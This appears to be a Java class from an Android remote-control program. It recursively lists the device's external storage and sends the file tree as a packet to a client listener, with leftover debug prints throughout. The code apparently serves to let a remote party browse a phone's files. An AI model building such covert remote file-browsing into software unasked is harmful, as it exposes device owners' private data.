package my.app.Library;

import java.io.File;
import java.util.ArrayList;

import my.app.client.ClientListener;

import utils.MyFile;
import Packet.FileTreePacket;
import android.content.Context;
import android.os.Environment;

public class DirLister {
	
	public static boolean listDir(ClientListener c, int channel, String dirname) {
		File f;
		ArrayList<MyFile> ar = new ArrayList<>();
		System.out.println("DIRRRRRRRRRRRRRRR"+dirname);
		if(dirname.equals("/")){
			System.out.println("aaaaa");
			f = Environment.getExternalStorageDirectory();
		}
		else{
			System.out.println("bbbbb");
			f = new File(dirname);
		}
		
		if (!f.exists()) {
			System.out.println("ccccc");
			return false;
		} 
		else {
			System.out.println("eeeee");
			ar.add(visitAllDirsAndFiles(f));

			System.out.println(ar.size());
			System.out.println(ar.toString());
			for (MyFile myFile : ar) {
				System.out.println(myFile.name);
			}
			c.handleData(channel, new FileTreePacket(ar).build());
			return true;
		}
	}
	
	public static void visitAllDirsAndFiles(File dir, ArrayList<MyFile> ar) {

		if(dir.exists()) {
		    if (dir.isDirectory()) {
		        String[] children = dir.list();
		        ar.add(new MyFile(dir));
		        if(children != null) {
			        for (String child: children) {
			        	//System.out.println(dir.toString()+"/"+child);
			        	try {
			        		File f = new File(dir, child);
			        		visitAllDirsAndFiles(f, ar);
			        	}
			        	catch(Exception e) {
			        		System.out.println("Child !"+child);
			        		e.printStackTrace();
			        	}
			        }
		        }
		    }
		    else
		    	ar.add(new MyFile(dir));
		}
	}
	
	public static MyFile visitAllDirsAndFiles(File dir) {

		if(dir.exists()) {
		    if (dir.isDirectory()) {
		        String[] children = dir.list();
		        MyFile myf = new MyFile(dir);
		        //ar.add(new MyFile(dir));
		        if(children != null) {
		        	if(children.length != 0) {
				        for (String child: children) {
				        	//System.out.println(dir.toString()+"/"+child);
				        	try {
				        		File f = new File(dir, child);
				        		myf.addChild(visitAllDirsAndFiles(f));
				        	}
				        	catch(Exception e) {
				        		System.out.println("Child !"+child);
				        		e.printStackTrace();
				        	}
				        }
		        	}
		        }
	        	return myf;
		    }
		    else
		    	return new MyFile(dir);
		}
		return null;
	}
	
}
